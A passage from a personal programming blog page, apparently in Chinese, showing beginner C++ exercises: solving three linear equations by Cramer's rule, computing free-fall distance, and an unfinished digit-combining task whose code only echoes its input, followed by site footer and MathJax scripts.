cin&gt;&gt;a1&gt;&gt;b1&gt;&gt;c1&gt;&gt;d1&gt;&gt;a2&gt;&gt;b2&gt;&gt;c2&gt;&gt;d2&gt;&gt;a3&gt;&gt;b3&gt;&gt;c3&gt;&gt;d3;</span><br><span class="line">    e=((a1*b2*c3)+(a2*b3*c1)+(a3*b1*c2)-(a3*b2*c1)-(b3*c2*a1)-(c3*b1*a2));</span><br><span class="line">    z=((a1*b2*d3)+(b1*d2*a3)+(d1*b3*a2)-(d1*b2*a3)-(d2*b3*a1)-(d3*b1*a2))/e;</span><br><span class="line">    x=((d1*b2*c3)+(b1*c2*d3)+(c1*b3*d2)-(c1*b2*d3)-(c2*b3*d1)-(c3*d2*b1))/e;</span><br><span class="line">    y=((a1*d2*c3)+(d1*c2*a3)+(c1*d3*a2)-(c1*d2*a3)-(c2*d3*a1)-(c3*d1*a2))/e;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;y=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;z=&quot;</span>&lt;&lt;z;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>4.計算自由落體的距離與時間關係，公式為d=v0t+gt^2/2</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> v0,t,g,d;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input v0,t,g&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;v0&gt;&gt;t&gt;&gt;g;</span><br><span class="line">    d=v0*t+(g*t*t)/<span class="number">2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;d=&quot;</span>&lt;&lt;d;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>5.請分別輸入1個0到9的整數，並將它合併為1個整數</strong><br>==例如:輸入1、2、3、4則輸出1234==<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    cin&gt;&gt;i;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;your input is:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/3/">« Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next »</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>

</body>
</html>